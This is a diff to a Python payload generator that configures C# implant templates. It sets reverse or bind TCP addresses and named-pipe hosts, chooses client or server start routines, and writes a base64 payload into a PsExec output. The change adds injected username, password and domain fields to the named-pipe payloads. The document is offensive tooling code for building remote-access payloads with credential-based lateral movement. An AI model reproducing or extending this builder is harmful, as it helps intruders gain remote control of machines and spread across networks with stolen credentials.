@@ -10,9 +10,15 @@ class mypayloadgen():
         self.__initstring1_tag = r"%%INITSTRINGONE%%"
         self.__initstring2_tag = r"%%INITSTRINGTWO%%"
         self.__startpayload_tag = r"%%STARTPAYLOAD%%"
+        self.__initusername_tag = r"%%INITUSERNAME%%"
+        self.__initpassword_tag = r"%%INITPASSWORD%%"
+        self.__initdomain_tag = r"%%INITDOMAIN%%"
         self.__initstring_setipstring = "t_app.ipstring = \"{}\";"
         self.__initstring_setnamepipehost = "t_app.namepipehost = \"{}\";"
         self.__initstring_setnamepipestring = "t_app.namepipestring = \"{}\";"
+        self.__initstring_setusername = "t_app.username = \"{}\";"
+        self.__initstring_setpassword = "t_app.password = \"{}\";"
+        self.__initstring_setdomain = "t_app.domain = \"{}\";"
         self.__initstartclient = "t_app.StartClient();"
         self.__initstartserver = "t_app.StartServer();"
         self.__initstartpipserver = "t_app.StartPipServer();"
@@ -264,7 +270,7 @@ class mypayloadgen():
         with open(os.path.join(self.__parentdir,self.__to_psdb,self.__psexec_outputname),mode='w') as f:
             f.write(all_of_it.replace(self.__payload_tag,myb64))
 
-    def set_config(self,typestr,reversestr,configstra,configstrb):
+    def set_config(self,typestr,reversestr,configstra,configstrb,username,password,domain):
 
         #read cs
         with open(os.path.join(self.__parentdir,self.__to_template,self.__filenameCS),mode='r') as f:
@@ -278,6 +284,10 @@ class mypayloadgen():
             #port and ip/host
             all_of_it = all_of_it.replace(self.__initstring1_tag,self.__initstring_setipstring.format("{}:{}".format(configstra,configstrb)))
             all_of_it = all_of_it.replace(self.__initstring2_tag,"")
+            all_of_it = all_of_it.replace(self.__initdomain_tag,"")
+            all_of_it = all_of_it.replace(self.__initusername_tag,"")
+            all_of_it = all_of_it.replace(self.__initpassword_tag,"")
+
             if reversestr == True:
                 all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartclient)
             else:
@@ -287,14 +297,14 @@ class mypayloadgen():
         if typestr == "pipe":
             all_of_it = all_of_it.replace(self.__initstring1_tag,self.__initstring_setnamepipehost.format(configstra))
             all_of_it = all_of_it.replace(self.__initstring2_tag,self.__initstring_setnamepipestring.format(configstrb))
+            all_of_it = all_of_it.replace(self.__initdomain_tag,self.__initstring_setdomain.format(domain))
+            all_of_it = all_of_it.replace(self.__initusername_tag,self.__initstring_setusername.format(username))
+            all_of_it = all_of_it.replace(self.__initpassword_tag,self.__initstring_setpassword.format(password))
+
             if reversestr == True:
                 all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartpipclient)
             else:
                 all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartpipserver)
-
-
-        #print(os.path.join(self.__parentdir,self.__toCS,self.__filenameCS))
-        #print(all_of_it)
 
         #write cs
         with open(os.path.join(self.__parentdir,self.__toCS,self.__filenameCS),mode='w') as f:
